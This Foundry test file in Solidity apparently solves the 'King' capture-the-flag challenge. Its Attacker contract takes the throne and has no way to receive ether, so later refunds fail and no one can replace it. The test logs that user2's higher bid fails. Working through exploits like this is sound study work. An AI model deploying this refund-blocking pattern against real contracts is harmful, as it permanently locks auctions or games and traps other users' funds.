// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "../src/King/King.sol";
import {Test, console} from "forge-std/Test.sol";

contract Testking is Test {
    King _king;

    function setUp() public {
        _king = new King();
    }

    fallback() external payable {}

    function test1() public {
        address user1 = address(0x123);
        address user2 = address(0x124);
        vm.deal(user1, 10 ether);
        vm.deal(user2, 10 ether);

        vm.prank(user1);
        (bool success,) = address(_king).call{value: 1 ether}("");

        console.log("user1 is king: ", _king._king() == user1);

        Attacker attacker = new Attacker{value: 1 ether}(_king);
        console.log("Attacker is New king: ", _king._king() == address(attacker));

        vm.prank(user2);
        (success,) = address(_king).call{value: 2 ether}("");
        console.log("user2 is New king: ", _king._king() == user2);

        if (!(_king._king() == user2)) {
            console.log("Hacked successfully, Attacker is the King forever");
        }
    }
}

contract Attacker {
    constructor(King _King) payable {
        (bool result,) = address(_King).call{value: msg.value}("");
    }
}
